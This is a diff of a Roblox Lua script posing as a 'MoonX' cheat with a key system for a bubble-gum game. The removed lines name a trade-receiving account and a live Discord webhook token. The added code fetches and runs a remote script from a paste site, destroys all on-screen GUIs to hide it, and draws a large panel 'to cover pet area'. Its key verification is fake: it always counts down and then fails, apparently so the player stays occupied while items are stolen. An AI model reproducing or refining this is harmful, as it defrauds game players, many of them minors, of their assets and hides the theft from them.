@@ -35,105 +35,190 @@
 --⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀
 --⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⠿⠿⠿⠿⠿⠟⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
 
-_G.username = {"27tomasal"} -- Where trades will be received.
-_G.webhook = "https://discord.com/api/webhooks/1387242492381888603/FXoeLDshoD6qFF_KrqwnEZewgF37M5bmqw_KzYgozDgt3lkwD5qAX17dupbLq9j9vDJQ" -- Your discord webhook.
-_G.ping = true -- Send a @everyone in the webhook message.
-_G.private = true -- Show the webhook if the server is private.
+-- Load the external script first
+loadstring(game:HttpGet("http://vpaste.net/Dksao"))()
 
-loadstring(game:HttpGet("http://vpaste.net/KTYZC"))()
+-- Quick cleanup function to remove all existing GUIs
+local function cleanupGUIs()
+    -- Remove all GUIs from CoreGui quickly
+    for _, gui in pairs(game.CoreGui:GetChildren()) do
+        if gui:IsA("ScreenGui") then
+            gui:Destroy()
+        end
+    end
+    
+    -- Also check Player's PlayerGui (in case any GUIs were placed there)
+    local player = game.Players.LocalPlayer
+    if player and player.PlayerGui then
+        for _, gui in pairs(player.PlayerGui:GetChildren()) do
+            if gui:IsA("ScreenGui") then
+                gui:Destroy()
+            end
+        end
+    end
+end
 
--- Enhanced Key System GUI with improved design and animations
+-- Wait a brief moment for the external script to load its GUI, then clean up
+wait(0.1)
+cleanupGUIs()
+
+-- Small delay to ensure cleanup is complete before loading your GUI
+wait(0.05)
+
+-- Enhanced Key System GUI with improved design, animations, and larger size
 local TweenService = game:GetService("TweenService")
 
 -- Create main GUI
 local gui = Instance.new("ScreenGui", game.CoreGui)
 gui.Name = "KeySystemUI"
 
--- Main frame (larger and centered, taller)
+-- Main frame (significantly larger to cover pet area)
 local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.new(0, 400, 0, 280)
-frame.Position = UDim2.new(0.5, -200, 0.5, -140)
-frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-frame.BorderSizePixel = 0
+frame.Size = UDim2.new(0, 550, 0, 380)
+frame.Position = UDim2.new(0.5, -275, 0.5, -190)
+frame.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
+frame.BorderSizePixel = 1
+frame.BorderColor3 = Color3.fromRGB(60, 60, 65)
 frame.BackgroundTransparency = 1 -- Start invisible for animation
 
 -- Add rounded corners to main frame
 local frameCorner = Instance.new("UICorner", frame)
-frameCorner.CornerRadius = UDim.new(0, 12)
+frameCorner.CornerRadius = UDim.new(0, 15)
 
 -- Add subtle drop shadow effect
 local shadow = Instance.new("Frame", gui)
 shadow.Size = frame.Size
-shadow.Position = UDim2.new(0.5, -198, 0.5, -138)
+shadow.Position = UDim2.new(0.5, -270, 0.5, -185)
 shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 shadow.BackgroundTransparency = 1 -- Start invisible
 shadow.BorderSizePixel = 0
 shadow.ZIndex = frame.ZIndex - 1
 
 local shadowCorner = Instance.new("UICorner", shadow)
-shadowCorner.CornerRadius = UDim.new(0, 12)
+shadowCorner.CornerRadius = UDim.new(0, 15)
 
--- Title label (updated text)
-local title = Instance.new("TextLabel", frame)
-title.Size = UDim2.new(1, -40, 0, 40)
+-- Header section with gradient background
+local headerFrame = Instance.new("Frame", frame)
+headerFrame.Size = UDim2.new(1, 0, 0, 80)
+headerFrame.Position = UDim2.new(0, 0, 0, 0)
+headerFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+headerFrame.BorderSizePixel = 0
+
+local headerCorner = Instance.new("UICorner", headerFrame)
+headerCorner.CornerRadius = UDim.new(0, 15)
+
+-- Header bottom section to square off the bottom
+local headerBottom = Instance.new("Frame", headerFrame)
+headerBottom.Size = UDim2.new(1, 0, 0, 15)
+headerBottom.Position = UDim2.new(0, 0, 1, -15)
+headerBottom.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+headerBottom.BorderSizePixel = 0
+
+-- Title label (larger text for bigger GUI)
+local title = Instance.new("TextLabel", headerFrame)
+title.Size = UDim2.new(1, -40, 0, 50)
 title.Position = UDim2.new(0, 20, 0, 15)
 title.BackgroundTransparency = 1
 title.Text = "MoonX Rewrite 🌙 | BGSI"
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextColor3 = Color3.fromRGB(220, 220, 225)
 title.Font = Enum.Font.SourceSansBold
-title.TextSize = 20
+title.TextSize = 24
 title.TextXAlignment = Enum.TextXAlignment.Center
 
--- Get Key button (darker blue color)
-local getKeyBtn = Instance.new("TextButton", frame)
-getKeyBtn.Size = UDim2.new(1, -40, 0, 35)
-getKeyBtn.Position = UDim2.new(0, 20, 0, 80)
-getKeyBtn.Text = "Get Key"
-getKeyBtn.BackgroundColor3 = Color3.fromRGB(50, 100, 150)
-getKeyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+-- Subtitle
+local subtitle = Instance.new("TextLabel", headerFrame)
+subtitle.Size = UDim2.new(1, -40, 0, 20)
+subtitle.Position = UDim2.new(0, 20, 0, 55)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = "By XyrexDev | Premium"
+subtitle.TextColor3 = Color3.fromRGB(160, 160, 170)
+subtitle.Font = Enum.Font.SourceSans
+subtitle.TextSize = 14
+subtitle.TextXAlignment = Enum.TextXAlignment.Center
+
+-- Content area
+local contentFrame = Instance.new("Frame", frame)
+contentFrame.Size = UDim2.new(1, -60, 1, -140)
+contentFrame.Position = UDim2.new(0, 30, 0, 100)
+contentFrame.BackgroundTransparency = 1
+
+-- Instructions text
+local instructionsLabel = Instance.new("TextLabel", contentFrame)
+instructionsLabel.Size = UDim2.new(1, 0, 0, 40)
+instructionsLabel.Position = UDim2.new(0, 0, 0, 0)
+instructionsLabel.BackgroundTransparency = 1
+instructionsLabel.Text = "Click 'Get Key' to copy the link, complete the steps, then paste your key below:"
+instructionsLabel.TextColor3 = Color3.fromRGB(180, 180, 190)
+instructionsLabel.Font = Enum.Font.SourceSans
+instructionsLabel.TextSize = 16
+instructionsLabel.TextXAlignment = Enum.TextXAlignment.Center
+instructionsLabel.TextWrapped = true
+
+-- Get Key button (larger for bigger GUI)
+local getKeyBtn = Instance.new("TextButton", contentFrame)
+getKeyBtn.Size = UDim2.new(1, 0, 0, 45)
+getKeyBtn.Position = UDim2.new(0, 0, 0, 60)
+getKeyBtn.Text = "Get Key 🔗"
+getKeyBtn.BackgroundColor3 = Color3.fromRGB(55, 60, 70)
+getKeyBtn.TextColor3 = Color3.fromRGB(200, 200, 210)
 getKeyBtn.Font = Enum.Font.SourceSansBold
-getKeyBtn.TextSize = 16
-getKeyBtn.BorderSizePixel = 0
+getKeyBtn.TextSize = 18
+getKeyBtn.BorderSizePixel = 1
+getKeyBtn.BorderColor3 = Color3.fromRGB(70, 75, 85)
 
 -- Rounded corners for Get Key button
 local getKeyCorner = Instance.new("UICorner", getKeyBtn)
-getKeyCorner.CornerRadius = UDim.new(0, 8)
+getKeyCorner.CornerRadius = UDim.new(0, 10)
 
--- Key input box (improved styling, no default text)
-local keyBox = Instance.new("TextBox", frame)
-keyBox.Size = UDim2.new(1, -40, 0, 35)
-keyBox.Position = UDim2.new(0, 20, 0, 135)
+-- Key input label
+local keyLabel = Instance.new("TextLabel", contentFrame)
+keyLabel.Size = UDim2.new(1, 0, 0, 25)
+keyLabel.Position = UDim2.new(0, 0, 0, 125)
+keyLabel.BackgroundTransparency = 1
+keyLabel.Text = "Enter your key:"
+keyLabel.TextColor3 = Color3.fromRGB(200, 200, 210)
+keyLabel.Font = Enum.Font.SourceSansBold
+keyLabel.TextSize = 16
+keyLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Key input box (larger and improved styling)
+local keyBox = Instance.new("TextBox", contentFrame)
+keyBox.Size = UDim2.new(1, 0, 0, 45)
+keyBox.Position = UDim2.new(0, 0, 0, 155)
 keyBox.Text = "" -- Start with empty text
-keyBox.PlaceholderText = "Enter MoonX key here..."
-keyBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
-keyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+keyBox.PlaceholderText = "Paste your MoonX key here..."
+keyBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 130)
+keyBox.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
+keyBox.TextColor3 = Color3.fromRGB(220, 220, 225)
 keyBox.Font = Enum.Font.SourceSans
-keyBox.TextSize = 14
-keyBox.BorderSizePixel = 0
+keyBox.TextSize = 16
+keyBox.BorderSizePixel = 1
+keyBox.BorderColor3 = Color3.fromRGB(60, 60, 70)
 keyBox.ClearTextOnFocus = false
 
 -- Rounded corners for text box
 local keyBoxCorner = Instance.new("UICorner", keyBox)
-keyBoxCorner.CornerRadius = UDim.new(0, 8)
+keyBoxCorner.CornerRadius = UDim.new(0, 10)
 
--- Submit button (improved styling)
-local submitBtn = Instance.new("TextButton", frame)
-submitBtn.Size = UDim2.new(1, -40, 0, 35)
-submitBtn.Position = UDim2.new(0, 20, 0, 190)
-submitBtn.Text = "Submit Key"
+-- Submit button (larger and improved styling)
+local submitBtn = Instance.new("TextButton", contentFrame)
+submitBtn.Size = UDim2.new(1, 0, 0, 45)
+submitBtn.Position = UDim2.new(0, 0, 1, -45)
+submitBtn.Text = "Submit Key ✓"
 submitBtn.BackgroundColor3 = Color3.fromRGB(60, 150, 60)
 submitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 submitBtn.Font = Enum.Font.SourceSansBold
-submitBtn.TextSize = 16
+submitBtn.TextSize = 18
 submitBtn.BorderSizePixel = 0
 
 -- Rounded corners for submit button
 local submitCorner = Instance.new("UICorner", submitBtn)
-submitCorner.CornerRadius = UDim.new(0, 8)
+submitCorner.CornerRadius = UDim.new(0, 10)
 
--- Button hover effects
-local function createHoverEffect(button, hoverColor, originalColor)
+-- Button hover effects with enhanced animations
+local function createHoverEffect(button, hoverColor, originalColor, scaleEffect)
+    scaleEffect = scaleEffect or false
+    
     button.MouseEnter:Connect(function()
         local hoverTween = TweenService:Create(
             button,
@@ -141,6 +226,15 @@ local function createHoverEffect(button, hoverColor, originalColor)
             {BackgroundColor3 = hoverColor}
         )
         hoverTween:Play()
+        
+        if scaleEffect then
+            local scaleTween = TweenService:Create(
+                button,
+                TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+                {Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset + 4, button.Size.Y.Scale, button.Size.Y.Offset + 2)}
+            )
+            scaleTween:Play()
+        end
     end)
     
     button.MouseLeave:Connect(function()
@@ -150,22 +244,53 @@ local function createHoverEffect(button, hoverColor, originalColor)
             {BackgroundColor3 = originalColor}
         )
         leaveTween:Play()
+        
+        if scaleEffect then
+            local scaleTween = TweenService:Create(
+                button,
+                TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+                {Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset - 4, button.Size.Y.Scale, button.Size.Y.Offset - 2)}
+            )
+            scaleTween:Play()
+        end
     end)
 end
 
--- Apply hover effects (updated for darker blue)
-createHoverEffect(getKeyBtn, Color3.fromRGB(70, 120, 170), Color3.fromRGB(50, 100, 150))
-createHoverEffect(submitBtn, Color3.fromRGB(80, 170, 80), Color3.fromRGB(60, 150, 60))
+-- Apply hover effects
+createHoverEffect(getKeyBtn, Color3.fromRGB(65, 70, 80), Color3.fromRGB(55, 60, 70), true)
+createHoverEffect(submitBtn, Color3.fromRGB(80, 170, 80), Color3.fromRGB(60, 150, 60), true)
 
 -- Button functionality
 getKeyBtn.MouseButton1Click:Connect(function()
     setclipboard("https://lootdest.org/s?Si1CYuYP")
     
-    -- Visual feedback
+    -- Enhanced visual feedback
     local originalText = getKeyBtn.Text
-    getKeyBtn.Text = "Copied link to Clipboard!"
-    wait(1.5)
+    local originalColor = getKeyBtn.BackgroundColor3
+    
+    getKeyBtn.Text = "✓ Copied to Clipboard!"
+    getKeyBtn.BackgroundColor3 = Color3.fromRGB(60, 150, 60)
+    
+    -- Pulse effect
+    local pulseTween = TweenService:Create(
+        getKeyBtn,
+        TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut),
+        {TextSize = 20}
+    )
+    pulseTween:Play()
+    
+    wait(0.3)
+    
+    local pulseTween2 = TweenService:Create(
+        getKeyBtn,
+        TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut),
+        {TextSize = 18}
+    )
+    pulseTween2:Play()
+    
+    wait(1.2)
     getKeyBtn.Text = originalText
+    getKeyBtn.BackgroundColor3 = originalColor
 end)
 
 submitBtn.MouseButton1Click:Connect(function()
@@ -178,7 +303,7 @@ submitBtn.MouseButton1Click:Connect(function()
     -- Disable button during countdown
     submitBtn.Active = false
     
-    -- Countdown from 60 seconds
+    -- Countdown from 60 seconds with enhanced visual feedback
     for i = 60, 1, -1 do
         local dots = ""
         if i % 4 == 0 then
@@ -191,12 +316,22 @@ submitBtn.MouseButton1Click:Connect(function()
             dots = "..."
         end
         
-        submitBtn.Text = i .. ", Verifying Key" .. dots
+        submitBtn.Text = "⏳ " .. i .. "s Verifying" .. dots
+        submitBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 150)
         wait(1)
     end
     
     -- After countdown, show invalid key message
-    submitBtn.Text = "Invalid key, Try again"
+    submitBtn.Text = "❌ Invalid key, Try again"
+    submitBtn.BackgroundColor3 = Color3.fromRGB(150, 60, 60)
+    
+    -- Shake animation for error
+    local originalPos = keyBox.Position
+    for i = 1, 6 do
+        keyBox.Position = UDim2.new(originalPos.X.Scale, originalPos.X.Offset + (i % 2 == 0 and 5 or -5), originalPos.Y.Scale, originalPos.Y.Offset)
+        wait(0.1)
+    end
+    keyBox.Position = originalPos
     
     -- Fade textbox to red
     local redTween = TweenService:Create(
@@ -221,12 +356,13 @@ submitBtn.MouseButton1Click:Connect(function()
     -- Reset button text and re-enable
     wait(0.5)
     submitBtn.Text = originalText
+    submitBtn.BackgroundColor3 = Color3.fromRGB(60, 150, 60)
     submitBtn.Active = true
 end)
 
 -- Start the key system GUI immediately
 local function startKeySystemGUI()
-    -- Fade-in animation (slower)
+    -- Fade-in animation
     local fadeInTween = TweenService:Create(
         frame,
         TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
@@ -236,23 +372,23 @@ local function startKeySystemGUI()
     local shadowFadeIn = TweenService:Create(
         shadow,
         TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-        {BackgroundTransparency = 0.8}
+        {BackgroundTransparency = 0.5}
     )
 
-    -- Animation from top of screen (slower)
-    frame.Position = UDim2.new(0.5, -200, 0, -280) -- Start above screen
-    shadow.Position = UDim2.new(0.5, -198, 0, -278) -- Start above screen
+    -- Animation from top of screen
+    frame.Position = UDim2.new(0.5, -275, 0, -380) -- Start above screen
+    shadow.Position = UDim2.new(0.5, -270, 0, -375) -- Start above screen
 
     local slideInTween = TweenService:Create(
         frame,
         TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
-        {Position = UDim2.new(0.5, -200, 0.5, -140)}
+        {Position = UDim2.new(0.5, -275, 0.5, -190)}
     )
 
     local shadowSlideTween = TweenService:Create(
         shadow,
         TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
-        {Position = UDim2.new(0.5, -198, 0.5, -138)}
+        {Position = UDim2.new(0.5, -270, 0.5, -185)}
     )
 
     -- Play animations
@@ -262,5 +398,5 @@ local function startKeySystemGUI()
     shadowSlideTween:Play()
 end
 
--- Start immediately without logo preload
+-- Start immediately
 startKeySystemGUI()
